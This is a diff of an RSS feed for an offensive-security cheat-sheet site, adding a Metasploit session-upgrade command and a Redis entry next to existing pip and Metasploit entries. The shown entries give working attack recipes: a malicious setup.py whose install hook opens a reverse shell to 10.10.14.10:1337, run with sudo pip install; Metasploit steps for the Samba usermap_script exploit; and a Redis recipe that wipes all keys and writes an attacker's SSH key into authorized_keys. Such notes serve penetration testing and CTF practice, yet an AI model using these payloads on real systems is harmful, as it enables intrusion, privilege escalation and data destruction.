@@ -33,7 +33,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
@@ -62,6 +62,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pip/</guid>
       <description> Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) # Run sudo pip install . </description>
+    </item>
+    <item>
+      <title>Redis</title>
+      <link>https://tldrbins.github.io/redis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/redis/</guid>
+      <description> Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.0.0.1 config set dbfilename &amp;#34;authorized_keys&amp;#34; redis-cli -h 127.0.0.1 save </description>
     </item>
     <item>
       <title>sudoers</title>
